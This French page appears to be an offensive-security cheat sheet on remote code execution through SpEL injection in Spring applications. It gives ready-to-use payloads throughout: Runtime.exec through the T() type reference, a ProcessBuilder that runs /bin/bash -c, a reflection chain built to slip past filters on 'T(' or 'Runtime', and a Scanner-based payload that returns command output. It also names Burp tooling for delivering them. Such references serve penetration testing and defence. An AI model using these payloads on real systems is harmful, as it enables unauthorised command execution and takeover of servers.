---
title: "Exécution de code SpEL : référence de type et réflexion vers Runtime"
description: "Sous un StandardEvaluationContext, la référence de type SpEL T() nomme java.lang.Runtime directement, et une chaîne de réflexion l'atteint sans l'opérateur, donnant l'exécution de commande dans Spring."
keywords:
  - exécution de code SpEL
  - "T(java.lang.Runtime)"
  - RCE par réflexion SpEL
  - StandardEvaluationContext
  - ProcessBuilder SpEL
---

# Exécution de code

SpEL atteint le runtime de l'hôte de deux façons : la référence de type `T(...)` qui nomme une classe directement, et une chaîne de réflexion qui atteint la même classe sans l'opérateur. Les deux dépendent du contexte d'évaluation. Un `StandardEvaluationContext`, la valeur par défaut lorsque le code applicatif construit son propre parseur, n'impose aucune restriction et les deux voies fonctionnent. Un `SimpleEvaluationContext` supprime les références de type et les constructeurs, donc seul le data binding subsiste et ces payloads ne s'appliquent pas.

## Voie par référence de type

`T(...)` résout une classe pleinement qualifiée, et un appel statique sur `java.lang.Runtime` exécute une commande. `Runtime.exec(String)` découpe en tokens sur les espaces sans shell, donc il convient à un unique programme avec des arguments simples :

```
T(java.lang.Runtime).getRuntime().exec('id')
```

Comme il n'y a pas de shell, les pipes, `$(...)`, `;` et les redirections sont passés comme argv littéral et ne chaînent pas. Pour les fonctionnalités de shell, construisez un `ProcessBuilder` avec un tableau d'arguments explicite où le shell est le programme :

```
new java.lang.ProcessBuilder(new String[]{'/bin/bash','-c','id; uname -a'}).start()
```

## Voie par réflexion

Là où `T(...)` est filtré, atteignez `Runtime` par réflexion depuis un littéral de chaîne. `''.class` donne la `Class`, `forName` charge `Runtime`, et `getMethod`/`invoke` appellent le `getRuntime` statique avant `exec` :

```
''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
```

La forme par réflexion est interchangeable avec la forme par référence de type ; elle existe pour survivre aux filtres qui se calent sur la séquence `T(` ou sur la chaîne littérale `Runtime` adjacente à une parenthèse.

## Récupérer la sortie

Pour renvoyer la sortie de commande plutôt que d'exécuter à l'aveugle, videz le flux du processus dans la même expression :

```
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'}).getInputStream()).useDelimiter('\\A').next()
```

Ici `exec(String[])` passe le tableau d'arguments directement sans découpage, donc la commande `bash -c` s'exécute intacte et le `Scanner` renvoie toute la sortie en un seul token.

## Outils

- **Burp Suite** : Repeater pour délivrer des payloads T()/réflexion sous StandardEvaluationContext.
- **J2EEScan** : extension Burp avec des contrôles d'injection SpEL.
- Payloads de réflexion SpEL manuels atteignant Runtime et ProcessBuilder.

## Références

- [Spring Framework: Spring Expression Language](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [PayloadsAllTheThings: Java SpEL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
